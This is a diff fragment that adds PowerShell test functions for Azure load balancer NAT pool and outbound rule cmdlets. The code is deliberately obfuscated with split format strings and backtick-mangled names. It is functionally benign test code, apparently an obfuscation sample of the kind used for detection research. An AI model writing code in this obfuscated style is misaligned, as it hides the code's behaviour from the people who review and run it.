+        ${L`I`st`iN`BO`UndnAtpOol} = &("{3}{8}{6}{7}{0}{5}{2}{1}{4}{9}" -f 'r','N','d','Get','atPoolConf','Inboun','d','Balance','-AzLoa','ig') -LoadBalancer ${v`lOa`dba`laNCER};
+        &("{2}{0}{3}{1}" -f't-','otNull','Asser','N') (${L`IsTINb`Ou`ND`N`ATP`oOl} | &("{1}{2}{3}{0}" -f'ct','Wher','e','-Obje') { ${_}."na`mE" -eq ${r`NamEA`DD} });
+
+        
+        &("{3}{2}{0}{1}{4}{5}"-f'Thr','o','ssert-','A','wsConta','ins') { &("{5}{2}{1}{4}{7}{3}{6}{0}" -f 'PoolConfig','Lo','d-Az','erI','adB','Ad','nboundNat','alanc') -Name ${RNAm`ea`DD} -LoadBalancer ${Vl`O`AdBalanCER} -FrontendIpConfiguration ${fR`ONTE`NDI`p`COn`FIG`U`RaTIoN} -Protocol ${pRot`OcOLA`dd} -FrontendPortRangeStart ${fRoN`Ten`D`POrTrAN`GEStAr`TadD} -FrontendPortRangeEnd ${fRonTeN`d`poRtra`NgEenDA`Dd} -BackendPort ${BACKEnDpO`R`T`A`Dd} } ("{1}{0}{2}" -f 'ready','al',' exists');
+
+        
+        ${V`LOADb`ALAncEr} = &("{9}{11}{8}{10}{0}{5}{4}{1}{3}{2}{6}{7}{12}"-f'L','rIn','dN','boun','Balance','oad','atP','o','e','Remo','-Az','v','olConfig') -LoadBalancer ${V`LOADbaLan`c`Er} -Name ${R`NAmEA`dd};
+        ${V`LOAD`Ba`l`AnCer} = &("{2}{3}{4}{6}{1}{0}{5}"-f'oolCo','dNatP','Remo','v','e-AzLoadBalancerI','nfig','nboun') -LoadBalancer ${vl`OA`dbA`lAncer} -Name ${R`N`AMe};
+        
+        ${vlo`ADb`ALAn`C`eR} = &("{0}{3}{11}{8}{10}{7}{2}{9}{5}{4}{6}{1}" -f 'R','g','oundNatPoo','em','n','Co','fi','ancerInb','-AzLoa','l','dBal','ove') -LoadBalancer ${V`lOadbAL`AN`ceR} -Name ${rN`AME};
+        
+        ${VLOadbA`La`NC`Er} = &("{1}{2}{0}{3}{4}" -f '-Az','Se','t','Loa','dBalancer') -LoadBalancer ${v`L`OadbALaN`ceR};
+        &("{0}{2}{1}"-f'Asse','l','rt-NotNul') ${VLO`A`Dba`L`ANcer};
+
+        
+        &("{1}{0}{4}{3}{2}{5}"-f'r','Asse','nt','sCo','t-Throw','ains') { &("{3}{4}{0}{2}{8}{10}{6}{1}{7}{5}{9}{11}"-f'AzLo','n','a','Ge','t-','dNatPoo','a','cerInboun','dB','lCon','al','fig') -LoadBalancer ${VLOaDb`Al`A`NcER} -Name ${Rn`Ame} } ("{6}{8}{9}{0}{1}{5}{4}{3}{10}{7}{2}{11}" -f 'n','s','eme','ing ','h',' no matc','Sequ','l','e','nce contai','e','nt');
+
+        
+        &("{2}{3}{1}{0}"-f'ains','Cont','A','ssert-Throws') { &("{7}{8}{3}{4}{2}{1}{5}{0}{6}" -f 'fi','C','ol','alancerInbound','NatPo','on','g','Set-AzLo','adB') -Name ${RN`A`mE} -LoadBalancer ${V`LOA`DBaL`ANCER} -FrontendIpConfiguration ${FRo`NT`Endi`pcO`NF`i`Gur`ATiON} -Protocol ${pR`Oto`cO`Lset} -FrontendPortRangeStart ${f`RONT`ENdPOrTr`AnG`estarTS`ET} -FrontendPortRangeEnd ${F`ROnTE`N`D`PO`R`TRAngeenDSEt} -BackendPort ${b`ACkENd`pO`Rts`ET} } ("{4}{1}{3}{0}{2}" -f'is','es no','t','t ex','do');
+    }
+    finally
+    {
+        
+        &("{2}{0}{1}{3}"-f'Reso','urceGro','Clean-','up') ${r`gNAme};
+    }
+}
+
+
+function teSt-INBOu`Ndn`AtPoOl`c`RuDA`ll`parAMETE`RS
+{
+    
+    ${R`g`NAmE} = &("{1}{3}{4}{0}{2}" -f 'ceGr','Get','oupName','-R','esour');
+    ${Rg`l`ocaTiOn} = &("{3}{2}{5}{1}{4}{0}" -f 'n','t','t-ProviderLoc','Ge','io','a') ("{0}{3}{4}{2}{1}"-f'Resourc','ement','ag','eM','an');
+    ${rn`AMe} = &("{0}{4}{1}{2}{3}" -f'G','t-','ResourceNa','me','e');
+    ${rNAm`Ea`Dd} = "${rname}Add";
+    ${lo`CA`TiOn} = &("{0}{4}{2}{3}{1}" -f'Ge','ion','ov','iderLocat','t-Pr') ("{3}{4}{2}{0}{5}{1}"-f 'Bala','rs','t.Network/load','Mic','rosof','nce');
+    
+    ${pR`O`ToCOL} = "Udp";
+    ${fRon`T`eN`D`p`OrTRANge`stArt} = 555;
+    ${Fron`TENd`P`O`RTRanGe`enD} = 999;
+    ${bAC`Ke`NDP`ort} = 987;
+    ${i`dLEt`IM`eo`UtINMInuteS} = 15;
+    ${e`NAbLEF`lo`A`T`InGIp} = ${tr`Ue};
+    ${EnA`B`LetcpR`eSet} = ${FA`L`SE};
+    
+    ${P`Ro`ToCo`LSET} = "Tcp";
+    ${F`Ront`ENdPO`RtRAN`GeSTaRT`s`ET} = 777;
+    ${F`R`OntENDpoRt`R`AN`GEen`ds`et} = 888;
+    ${BaCK`enDpo`R`TseT} = 789;
+    ${i`dl`ET`ImEoUtInmin`UteS`s`eT} = 30;
+    ${E`NABlEFlOa`Ti`N`GipsEt} = ${FaL`Se};
+    ${ENAb`l`et`CpreSE`TSeT} = ${fA`l`se};
+    
+    ${pRotoc`O`lAdD} = "Tcp";
+    ${FronTEnDpO`R`T`RanGESt`ArT`ADd} = 444;
+    ${fRO`NtenDPOrTRa`NGEe`ND`A`dd} = 445;
+    ${BA`cK`End`PO`RTadd} = 8080;
+    ${id`LEtimeOu`TiN`minu`Te`sA`Dd} = 5;
+    ${en`AblEF`LOAtI`N`GI`Pa`dD} = ${f`ALse};
+    ${E`NAbL`ETc`PReSEt`Add} = ${f`AlsE};
+    
+    ${publICI`PA`dDREs`snaME} = ("{1}{0}{2}{3}"-f 'c','Publi','IPA','ddressName');
+    ${p`UblI`ciPAdDr`essAL`LO`CATionME`THOd} = ("{1}{0}" -f'tatic','S');
+    ${FRonT`Endipc`ONfIgU`RAtIo`N`Na`Me} = ("{2}{3}{6}{1}{4}{5}{0}{7}" -f'o','d','Fr','on','IP','Configurati','ten','nName');
+
+    try
+    {
+        ${rEs`Ourceg`RoUP} = &("{2}{1}{3}{0}"-f'urceGroup','w-A','Ne','zReso') -Name ${R`GN`AMe} -Location ${rGLocA`T`iOn};
+
+        
+        ${pU`BlIciP`ADD`RE`Ss} = &("{2}{4}{3}{0}{1}"-f'dr','ess','New-AzPublicI','d','PA') -ResourceGroupName ${RGn`A`ME} -Location ${l`ocATi`ON} -Name ${P`U`BlIC`IpAD`DreSSnAMe} -AllocationMethod ${p`UblIci`pADDR`e`sSALLOcat`iONMeTHOd};
+        ${fROnT`E`Ndi`PConFi`GUr`AtION} = &("{0}{3}{2}{1}{4}{6}{5}"-f'New','dBalancer','oa','-AzL','F','fig','rontendIpCon') -Name ${FrO`N`T`EnD`I`PcONfiGU`RATiONNAME} -PublicIpAddress ${PUBLIC`ipA`DD`RE`Ss};
+
+        
+        ${ViN`BOU`NdN`AtP`ooL} = &("{3}{7}{4}{8}{0}{9}{6}{2}{10}{1}{5}"-f 'ce','Poo','a','N','ad','lConfig','ndN','ew-AzLo','Balan','rInbou','t') -Name ${Rn`A`Me} -FrontendIpConfiguration ${fr`On`Ten`D`IpC`ONFIgur`At`ioN} -Protocol ${pRo`TOCol} -FrontendPortRangeStart ${Fr`o`NTENDpOrtr`A`Nge`StA`Rt} -FrontendPortRangeEnd ${FR`o`Nte`Ndportr`AN`Ge`EnD} -BackendPort ${bACk`e`NDpoRt} -IdleTimeoutInMinutes ${idl`e`TiMeo`U`TInM`in`UtEs} -EnableFloatingIP;
+        &("{1}{3}{0}{2}" -f'otNul','Assert-','l','N') ${vinbOun`dNA`T`pOOl};
+        &("{0}{2}{1}"-f'Assert','True','-') { &("{0}{2}{1}{3}{4}"-f 'Check-C','l','md','etRet','urnType') ("{4}{2}{6}{3}{0}{1}{5}" -f'oundNatPoolConf','i','n','rInb','New-AzLoadBala','g','ce') ${ViNbOuNdNa`T`p`oOl} };
+        ${VLoAD`B`AlaNcER} = &("{1}{0}{3}{2}"-f 'AzL','New-','dBalancer','oa') -ResourceGroupName ${r`gNaMe} -Name ${r`NA`Me} -InboundNatPool ${ViNb`O`UndNaT`PoOL} -FrontendIPConfiguration ${Fr`O`Nt`EN`D`iPcoNFIguRaTI`oN} -Location ${lOC`A`TIon};
+        &("{2}{0}{1}{4}{3}" -f's','ert','As','ll','-NotNu') ${vL`o`A`dbAl`ANceR};
+        &("{1}{4}{0}{3}{2}"-f'tN','Asser','l','ul','t-No') ${v`lOAD`BaL`AnC`er}."F`ROnTenD`i`pCo`NFIGurAt`io`Ns";
+        &("{1}{2}{0}" -f 'True','A','ssert-') { ${Vloa`DBal`AN`CeR}."fro`N`Ten`DiPcoN`FIGUR`AtI`Ons"."le`NG`Th" -gt 0 };
+        &("{0}{2}{3}{1}"-f 'Asse','al','rt-Are','Equ') ${Rn`AMe} ${vinbo`U`Nd`Na`TPOoL}."n`AMe";
+        &("{2}{0}{3}{1}" -f's','al','A','sert-AreEqu') ${Pro`Toc`Ol} ${vi`N`BO`UnDNaTpo`OL}."PrO`ToC`ol";
+        &("{2}{3}{0}{1}"-f'E','qual','Assert-','Are') ${fro`NTEndPo`Rtr`AN`gest`A`RT} ${VIn`BoU`N`dNaTpOOL}."fRoNTENdP`oR`TrAn`g`EST`A`RT";
+        &("{0}{3}{1}{2}"-f'Assert','eE','qual','-Ar') ${FRo`NteN`d`poRt`RAN`gEend} ${vInBoU`Nd`Na`Tp`oOl}."F`RON`TeNdpOrt`Ra`NGEeND";
+        &("{2}{4}{3}{1}{0}" -f'l','a','Assert-Are','qu','E') ${BacKE`Ndp`orT} ${VInBou`NdnAt`P`o`Ol}."B`AC`KEnd`POrT";
+        &("{3}{2}{1}{0}"-f 'qual','ert-AreE','s','As') ${I`DlEtI`meOUtI`NmInut`eS} ${vinb`OUn`DnAtpOoL}."i`d`LE`T`ImEoutiNmI`NU`TEs";
+        &("{0}{2}{1}{3}"-f 'Asse','reEqu','rt-A','al') ${EnABlEfLO`A`TI`NGIp} ${vinbO`U`ND`NatPoOL}."E`NA`BLeFLo`ATi`NgIp";
+        &("{4}{3}{1}{2}{0}" -f'qual','r','eE','ssert-A','A') ${EN`A`BLE`TcprESeT} ${v`InB`oU`NdnATpO`oL}."enAbL`ETC`Pr`ES`eT";
+
+        
+        ${v`INbo`Un`DnATPOol} = &("{8}{6}{7}{5}{0}{3}{9}{2}{4}{10}{1}"-f 'ound','g','tPo','N','olC','Inb','-AzLoadBalance','r','Get','a','onfi') -LoadBalancer ${vlOAD`BaLa`N`cER} -Name ${R`NAme};
+        &("{3}{1}{4}{0}{2}" -f 'N','rt','ull','Asse','-Not') ${V`IN`Bou`N`DNATPOOL};
+        &("{1}{0}{2}{3}"-f 's','A','sert-','True') { &("{4}{1}{0}{2}{3}"-f 'rnTy','-CmdletRetu','p','e','Check') ("{4}{0}{2}{7}{1}{6}{5}{3}" -f 'Loa','Inb','dB','lConfig','Get-Az','atPoo','oundN','alancer') ${vINBo`Un`dnA`TPOol} };
+        &("{1}{0}{2}" -f 's','A','sert-AreEqual') ${Rna`Me} ${ViN`BoUn`d`NA`TpOOl}."n`AmE";
+        &("{1}{2}{0}{3}" -f 'eEqua','As','sert-Ar','l') ${pR`otO`C`ol} ${vIN`B`oU`NdnATp`oOl}."P`ROToc`Ol";
+        &("{1}{4}{3}{2}{0}" -f'al','Ass','Equ','re','ert-A') ${fr`onTE`N`Dpor`TRAnges`TArt} ${VinBo`UnDN`ATpoOl}."FRoN`TE`NdpoR`T`RANgESt`A`RT";
+        &("{0}{4}{3}{1}{2}" -f 'Ass','t-AreEqua','l','r','e') ${FrONT`e`N`DP`OrTrANGe`E`Nd} ${VI`NbOuND`NaTPo`Ol}."F`RonT`enDpO`RtrAN`G`eEND";
+        &("{1}{2}{0}{3}"-f'rt','Ass','e','-AreEqual') ${Bac`KEn`dp`OrT} ${vinb`O`U`NdNatPoOl}."B`AckendP`ORt";
+        &("{1}{3}{2}{0}"-f'al','Asse','-AreEqu','rt') ${I`d`letimeO`UtINmI`NutEs} ${viNbo`UnDNATp`OOl}."IdLEt`iMEOuti`NMI`Nu`TeS";
+        &("{1}{2}{0}" -f 'qual','Asser','t-AreE') ${eNa`BlEf`loAt`INGiP} ${VIN`BoU`Nd`NATpooL}."enAB`LE`F`lo`ATinGIP";
+        &("{3}{1}{2}{4}{0}"-f'l','rt','-','Asse','AreEqua') ${eN`ABletCP`RE`s`et} ${vIn`B`O`UnDnatpO`OL}."eNaBLetCP`R`Es`eT";
+
+        
+        ${lIstINBo`U`NDn`A`TPooL} = &("{5}{2}{6}{1}{7}{0}{3}{4}" -f'nb','oadBalanc','Az','oundNatPoolConfi','g','Get-','L','erI') -LoadBalancer ${VL`o`ADBA`L`ANceR};
+        &("{0}{1}{2}" -f 'Assert','-NotNu','ll') (${lIsT`i`NB`OUNDna`TPoOl} | &("{3}{2}{1}{0}" -f'Object','-','re','Whe') { ${_}."N`AmE" -eq ${rNa`mE} });
+
+        
+        ${VLOADBAL`An`CER} = &("{2}{0}{8}{4}{3}{1}{7}{6}{10}{9}{5}"-f't-AzLoa','nbo','Se','rI','nce','nfig','dN','un','dBala','oolCo','atP') -Name ${r`N`AmE} -LoadBalancer ${Vl`OADb`A`LANc`er} -FrontendIpConfiguration ${F`RO`NT`eNDi`pCONFiGu`Ration} -Protocol ${P`ROTo`colsET} -FrontendPortRangeStart ${fRO`NT`Endp`OrtraNGEs`TA`RTsEt} -FrontendPortRangeEnd ${Fro`NtE`NdP`o`RTrangEeN`d`SeT} -BackendPort ${baCkEN`dPOR`T`s`Et} -IdleTimeoutInMinutes ${iDL`ET`Ime`oU`TinmI`NUtESSet};
+        &("{3}{1}{0}{4}{2}" -f 'N','sert-','l','As','otNul') ${Vl`oaDbA`lANc`er};
+        ${Vlo`AD`BaL`AncEr} = &("{0}{3}{2}{1}{4}" -f'Set','al','zLoadB','-A','ancer') -LoadBalancer ${VlO`Ad`Ba`LaNCer};
+        &("{2}{0}{1}"-f'rt-NotNul','l','Asse') ${vLo`ADBa`LA`NceR};
+
+        
+        ${VINBOu`NDn`At`PO`ol} = &("{7}{2}{1}{0}{10}{9}{6}{3}{4}{5}{8}" -f 'd','Loa','Az','Na','t','Poo','erInbound','Get-','lConfig','anc','Bal') -LoadBalancer ${V`lOA`dBaLanCeR} -Name ${R`Na`mE};
+        &("{0}{2}{1}" -f 'As','NotNull','sert-') ${VInBoundn`A`TPo`ol};
+        &("{3}{1}{0}{2}" -f't-','er','True','Ass') { &("{1}{4}{2}{3}{0}" -f'ype','Ch','-CmdletRe','turnT','eck') ("{4}{7}{3}{8}{1}{0}{6}{2}{5}"-f'NatPoo','rInbound','n','adB','Get','fig','lCo','-AzLo','alance') ${Vin`BOu`NDNAT`Po`OL} };
+        &("{3}{2}{0}{1}"-f'-Ar','eEqual','ert','Ass') ${r`N`AMe} ${ViN`BOUN`DnATP`o`OL}."n`AmE";
+        &("{1}{0}{2}"-f't-AreEqua','Asser','l') ${Pro`To`cOLsET} ${viNBo`UNDna`T`Po`ol}."prO`TOC`oL";
+        &("{0}{1}{3}{2}"-f 'A','ssert-AreE','l','qua') ${fRonT`eNDpoR`TR`ANG`E`sTaR`T`SeT} ${Vi`Nboun`d`NatPO`Ol}."frO`NTENDP`O`RTRAn`geSTaRt";
+        &("{3}{2}{0}{1}"-f 'A','reEqual','sert-','As') ${FRONTeNDP`oRT`RanGE`E`NDs`et} ${vInB`oun`DN`AtPOol}."fr`ONTE`NDpORtR`ANge`eND";
+        &("{2}{1}{0}" -f 'qual','-AreE','Assert') ${BAcK`Endp`or`TSET} ${v`I`NboU`ND`NaTP`oOL}."b`AcKe`NdpO`RT";
+        &("{2}{0}{1}" -f'rt-AreEqua','l','Asse') ${IdL`ETIme`oUTINmi`Nute`sSet} ${V`I`NboundNatPO`ol}."I`dLEtIme`OUtINm`InuTes";
+        &("{4}{3}{1}{2}{0}"-f'al','re','Equ','A','Assert-') ${ENAbleFloa`T`iN`gIpSet} ${ViNBo`U`ND`N`ATpo`Ol}."enA`Bl`efLoA`T`Ing`IP";
+        &("{1}{0}{3}{2}{4}"-f 'ss','A','eE','ert-Ar','qual') ${enableT`C`Pr`ESeT`SeT} ${v`I`NBoUn`dnatP`OOl}."EnaB`lEt`Cpre`SeT";
+
+        
+        ${lI`STiNBOu`ND`N`AT`pOol} = &("{1}{3}{6}{5}{0}{7}{10}{8}{2}{9}{4}"-f 'Inb','Get','tPoo','-AzLoadB','onfig','lancer','a','o','dNa','lC','un') -LoadBalancer ${Vlo`A`DBAlaN`ceR};
+        &("{0}{2}{1}{3}"-f 'As','-NotNul','sert','l') (${LI`S`TInbOUND`NAtpo`OL} | &("{1}{2}{3}{0}"-f't','Where-Ob','j','ec') { ${_}."n`AmE" -eq ${r`Na`mE} });
+
+        
+        ${V`LOadBAl`AnC`Er} = &("{6}{2}{7}{5}{4}{3}{0}{1}" -f 'C','onfig','d','Pool','dBalancerInboundNat','oa','Ad','-AzL') -Name ${rNaM`E`Add} -LoadBalancer ${V`LOAdB`A`L`AncER} -FrontendIpConfiguration ${F`R`OntEN`dIpCoNF`igUratiOn} -Protocol ${pro`ToC`OlAdD} -FrontendPortRangeStart ${Fro`N`TEndpO`Rtr`ANgEsta`Rt`ADD} -FrontendPortRangeEnd ${frOn`T`E`NdpOrTRangeen`Da`dd} -BackendPort ${Backe`NDpO`R`T`ADd} -IdleTimeoutInMinutes ${I`dLET`imeOUTi`NMI`Nu`TE`SADd};
+        &("{3}{0}{1}{2}"-f 'se','rt-','NotNull','As') ${VlOa`DBaL`A`Ncer};
+        ${vlO`A`dbaLancEr} = &("{2}{0}{1}{3}" -f '-A','zLoad','Set','Balancer') -LoadBalancer ${Vl`oa`D`B`ALaNcEr};
+        &("{4}{0}{3}{2}{1}" -f 'sse','NotNull','t-','r','A') ${v`l`oA`DBal`ANcer};
+
+        
+        ${v`InBo`UndnatPO`oL} = &("{6}{4}{8}{10}{1}{3}{0}{2}{9}{7}{5}" -f 'nd','rInbo','NatPool','u','-AzLoadBa','ig','Get','f','l','Con','ance') -LoadBalancer ${v`l`OaDbaL`A`NCEr} -Name ${RN`A`MeAdd};
+        &("{3}{2}{1}{0}" -f'll','Nu','t-Not','Asser') ${Vi`NBOUn`dNatP`OOl};
+        &("{1}{2}{0}{3}" -f't-Tr','A','sser','ue') { &("{3}{5}{6}{1}{0}{2}{4}" -f 'etur','-CmdletR','n','C','Type','hec','k') ("{7}{2}{0}{3}{8}{9}{5}{10}{1}{6}{4}"-f'-A','Pool','t','zL','fig','Balan','Con','Ge','oa','d','cerInboundNat') ${ViNBo`Un`d`N`AtPOOL} };
+        &("{2}{1}{0}"-f 'l','rt-AreEqua','Asse') ${rNAME`ADd} ${vIN`B`oun`dnATPoOL}."N`AmE";
+        &("{0}{3}{2}{1}" -f'As','l','-AreEqua','sert') ${P`ROto`cOlaDD} ${vin`B`oUND`NATPo`oL}."P`Ro`TOcOl";
+        &("{2}{4}{1}{3}{0}"-f'ual','t-Are','As','Eq','ser') ${FRONte`N`dpO`R`Tr`AnGestArT`Add} ${vI`NboU`NDN`At`pOol}."fRONt`En`Dp`OrTrANge`stArt";
+        &("{0}{3}{2}{1}" -f 'Assert-','l','a','AreEqu') ${FR`O`NTeNDpo`RtR`ANGEeNdAdD} ${V`I`NB`O`UNdnATPOOl}."frONTenDPoRtR`ANg`EE`ND";
+        &("{2}{1}{0}{4}{3}" -f 'rt-AreEqu','sse','A','l','a') ${ba`Cke`NdP`ORtadD} ${Vi`NB`OU`ND`NAtpOoL}."Backe`N`dport";
+        &("{1}{0}{2}"-f 'ssert-AreEq','A','ual') ${Id`lE`T`ImEOuti`NMinUt`E`SaDD} ${V`i`Nbo`UNdNAtpooL}."i`dLEtImeOu`T`inmInuT`Es";
+        &("{0}{1}{2}{3}" -f'A','ss','ert-','AreEqual') ${E`N`ABlEFloAtinGIPa`Dd} ${VI`Nb`ou`NDnaTpo`ol}."EnA`BLe`FloatIN`giP";
+        &("{3}{0}{4}{2}{1}"-f'ssert','Equal','e','A','-Ar') ${ena`Bl`eTCp`Re`Setadd} ${VIn`Bo`Und`Na`TPOOL}."en`ABleT`cP`RESeT";
+
+        
+        ${liStinBOUn`DNAT`p`OOl} = &("{5}{7}{8}{6}{4}{1}{3}{2}{9}{0}" -f 'ig','al','erInboundNa','anc','adB','G','AzLo','e','t-','tPoolConf') -LoadBalancer ${vL`O`ADBAlancER};
+        &("{3}{2}{1}{4}{0}"-f 'Null','N','ert-','Ass','ot') (${LIStInBou`ND`Natp`ooL} | &("{2}{1}{0}"-f'bject','O','Where-') { ${_}."n`AMe" -eq ${RnaME`AdD} });
+
+        
+        &("{1}{3}{0}{4}{5}{2}" -f 'h','Assert','ns','-T','r','owsContai') { &("{0}{3}{4}{5}{1}{6}{7}{2}" -f 'Add','undNa','fig','-AzLo','adBal','ancerInbo','tPool','Con') -Name ${rN`Am`eADD} -LoadBalancer ${V`LoaD`BalAnc`eR} -FrontendIpConfiguration ${froNt`Endi`pcOnfIGur`A`TIoN} -Protocol ${pr`O`TOCOLADd} -FrontendPortRangeStart ${fROntE`NdpoR`TRAN`GEsT`ARTa`Dd} -FrontendPortRangeEnd ${fRo`NtEndPo`RT`RangEe`N`D`ADd} -BackendPort ${ba`cK`E`NdportA`DD} -IdleTimeoutInMinutes ${i`Dl`E`Tim`E`OUtINMInUTeS`ADD} } ("{0}{1}{2}"-f 'alread','y ','exists');
+
+        
+        ${vloAD`B`ALA`NcEr} = &("{2}{5}{4}{7}{0}{1}{9}{6}{11}{3}{8}{10}"-f 'an','ce','Remove-A','oolCo','adBa','zLo','Inbound','l','nf','r','ig','NatP') -LoadBalancer ${Vl`oAd`BAlANCeR} -Name ${RnaM`e`Add};
+        ${vlO`ADb`ALANc`eR} = &("{0}{1}{6}{7}{2}{4}{5}{3}"-f'R','e','ancerIn','PoolConfig','bound','Nat','move','-AzLoadBal') -LoadBalancer ${Vl`o`ADba`lAnceR} -Name ${RN`AMe};
+        
+        ${VloadbaL`A`Nc`er} = &("{3}{4}{9}{0}{10}{11}{6}{1}{2}{8}{5}{7}" -f 'erIn','atPool','C','Rem','ove-AzLoadBa','n','dN','fig','o','lanc','bo','un') -LoadBalancer ${V`LoA`D`Ba`LanCEr} -Name ${r`NaME};
+        
+        ${vLOADb`A`lAn`cER} = &("{4}{3}{0}{1}{2}"-f'B','alanc','er','-AzLoad','Set') -LoadBalancer ${v`loaD`BALa`N`cEr};
+        &("{2}{1}{0}{3}"-f '-','sert','As','NotNull') ${VloaDbalaN`C`eR};
+
+        
+        &("{0}{2}{1}{3}" -f 'Assert-Th','sContain','row','s') { &("{3}{5}{2}{6}{1}{4}{8}{7}{0}" -f 'ig','rI','Lo','Get-','nboundNatP','Az','adBalance','f','oolCon') -LoadBalancer ${VloaDBAL`AN`CER} -Name ${r`NAME} } ("{8}{1}{6}{2}{7}{4}{3}{9}{0}{5}" -f'leme',' co','i','hin','s no matc','nt','nta','n','Sequence','g e');
+
+        
+        &("{0}{4}{1}{3}{2}" -f 'A','s','Contains','ert-Throws','s') { &("{5}{1}{0}{8}{6}{4}{7}{9}{2}{3}" -f 'alan','adB','f','ig','rInboundNa','Set-AzLo','e','tPoolC','c','on') -Name ${RnA`Me} -LoadBalancer ${VL`OAD`B`ALanCer} -FrontendIpConfiguration ${Fr`ONte`NDip`cOn`FigURATI`on} -Protocol ${PR`O`TOCo`lSEt} -FrontendPortRangeStart ${fro`N`TEnDPoR`TRA`NgestaRtSEt} -FrontendPortRangeEnd ${FR`o`NTeNDPoRt`Ran`gee`Nd`set} -BackendPort ${b`Ac`KE`NdPOrtset} -IdleTimeoutInMinutes ${i`D`LEtIM`EoUTINMi`NUtEsset} } ("{2}{3}{1}{0}" -f't','t exis','doe','s no');
+    }
+    finally
+    {
+        
+        &("{3}{4}{5}{0}{2}{1}" -f 'ceGr','p','ou','C','lean-Resou','r') ${rGn`A`ME};
+    }
+}
+
+
+function tesT-ou`TBou`N`D`R`ULeCRU`DMinI`mAlPArAMetErs
+{
+    
+    ${R`gn`Ame} = &("{0}{2}{1}{4}{3}" -f'Get-Reso','rc','u','GroupName','e');
+    ${RGLoc`A`TIOn} = &("{1}{0}{2}{3}" -f '-Provide','Get','rLocat','ion') ("{2}{5}{1}{4}{0}{3}" -f 'nagem','sour','R','ent','ceMa','e');
+    ${RNA`ME} = &("{1}{2}{0}{3}" -f'rce','Get-R','esou','Name');
+    ${R`NamE`Add} = "${rname}Add";
+    ${L`Oc`ATiOn} = &("{1}{0}{2}{5}{3}{4}"-f 'et','G','-P','erLoca','tion','rovid') ("{7}{3}{5}{6}{1}{4}{0}{2}"-f 'nce','oadBa','rs','t.Net','la','w','ork/l','Microsof');
+    
+    ${pR`otO`cOl} = "Udp";
+    
+    ${PROToCO`l`SET} = "Tcp";
+    
+    ${p`ROTOc`oLA`DD} = "All";
+    
+    ${P`UBl`ICI`paD`D`RESsNaMe} = ("{1}{3}{5}{6}{2}{4}{0}"-f'ssName','Pu','d','b','dre','li','cIPA');
+    ${pU`B`lIc`iPaDD`REss`N`AMeADD} = ("{3}{4}{1}{0}{2}{5}" -f's','es','Na','Publi','cIPAddr','meAdd');
+    ${PuBLic`ipadd`Re`SSalloCatiOn`M`ethod} = ("{1}{0}"-f'ic','Stat');
+    ${PuBl`IC`iP`A`d`dResSsku} = ("{2}{1}{0}"-f 'ard','nd','Sta');
+    ${f`RonTeNDIPc`ONf`IGurAT`io`NN`AMe} = ("{0}{3}{4}{1}{5}{2}" -f'F','IP','Name','ronte','nd','Configuration');
+    ${fRo`NT`E`Nd`IpcoNfig`UrAtI`O`Nn`A`meaDd} = ("{4}{1}{3}{5}{2}{0}" -f'meAdd','ontendIPCo','Na','nfigur','Fr','ation');
+    ${b`A`C`KeNDaDdResSpOoLnAME} = ("{1}{2}{5}{0}{3}{4}" -f'ssPool','Ba','ckendAd','Nam','e','dre');
+    ${b`ACKENDaDDreS`sPoOLn`A`M`eAdD} = ("{6}{2}{0}{4}{3}{5}{1}"-f 'd','lNameAdd','ckendAd','sPo','res','o','Ba');
+    ${lOAdBal`AN`c`eRSkU} = ("{0}{2}{1}" -f 'S','dard','tan');
+
+    try
+    {
+        ${REs`o`URcEgrO`UP} = &("{0}{1}{3}{2}" -f'New-A','zResourceG','up','ro') -Name ${r`gna`ME} -Location ${R`gLOcaTi`oN};
+
+        
+        ${PUblI`ci`PAd`DRE`Ss} = &("{2}{4}{0}{1}{3}{5}"-f'w','-AzP','N','u','e','blicIPAddress') -ResourceGroupName ${Rg`N`AMe} -Location ${L`ocaTiOn} -Name ${Publi`CIP`A`DdR`ESsNAMe} -AllocationMethod ${Pub`lic`IpAddRessalloc`ATio`NME`THod} -Sku ${PuB`lIcIpa`ddRe`s`ss`kU};
+        ${f`RONt`ENdIpcoNF`I`gUrAT`i`ON} = &("{6}{3}{1}{5}{0}{4}{2}"-f'Conf','erFrontend','g','alanc','i','Ip','New-AzLoadB') -Name ${fRO`NtendIP`cONF`i`Gu`R`At`IOnNamE} -PublicIpAddress ${pubL`I`CiPADdr`ESs};
+        ${BA`C`kEnDa`dDResspo`Ol} = &("{3}{2}{8}{4}{5}{0}{9}{10}{6}{1}{7}"-f 'ndAddr','o','ew-AzLoa','N','ncerB','acke','Po','lConfig','dBala','e','ss') -Name ${baC`KeND`ADdRE`S`sPO`oLNa`mE};
+        ${P`UblIc`ipaDdREsS`A`dd} = &("{0}{3}{6}{1}{4}{5}{2}"-f 'Ne','P','ess','w-AzPubl','Ad','dr','icI') -ResourceGroupName ${r`gNa`me} -Location ${LOCa`TIon} -Name ${PUBLiciPA`dd`REs`SNA`mEadd} -AllocationMethod ${pUB`LICIPaDD`R`ESSALLOC`ATionm`ethOd} -Sku ${pu`BLic`IPAD`drE`Ss`Sku};
+        ${F`Ro`NTeNDiPCO`NfiGu`Rati`O`NaDD} = &("{3}{5}{0}{1}{2}{4}"-f 'BalancerFron','te','ndIpCo','New','nfig','-AzLoad') -Name ${fROnTE`N`DipconFiG`Ura`T`i`oNnaMeADd} -PublicIpAddress ${p`U`Bli`Ci`pAdDRe`ssAdD};
+        ${Bac`Ke`NDaDd`R`eS`s`poOLaDd} = &("{5}{7}{3}{2}{0}{1}{6}{8}{4}"-f'e','rBack','lanc','adBa','Config','N','e','ew-AzLo','ndAddressPool') -Name ${backE`N`Dad`dres`Spo`OLNAmeAdd};
+
+        
+        ${V`OUT`B`OUnDRULe} = &("{3}{7}{6}{5}{2}{8}{0}{1}{4}" -f 'erOutb','ou','a','New-A','ndRuleConfig','l','dBa','zLoa','nc') -Name ${Rn`AME} -FrontendIPConfiguration ${froNte`ND`IPcoNf`IgUrAt`i`ON} -BackendAddressPool ${Ba`c`kENdad`dR`eSspOOL} -Protocol ${P`RO`ToCol};
+        &("{0}{2}{1}{3}"-f 'Asse','t-Not','r','Null') ${vO`UT`Bo`UNdrU`LE};
+        &("{2}{1}{3}{0}"-f 'rue','ert','Ass','-T') { &("{2}{1}{5}{4}{3}{0}"-f'pe','e','Check-Cmdl','y','T','tReturn') ("{6}{2}{4}{5}{1}{0}{7}{10}{8}{9}{3}" -f 'o','rOutb','w-AzLo','eConfig','adBala','nce','Ne','un','Ru','l','d') ${VOu`TboU`NdrulE} };
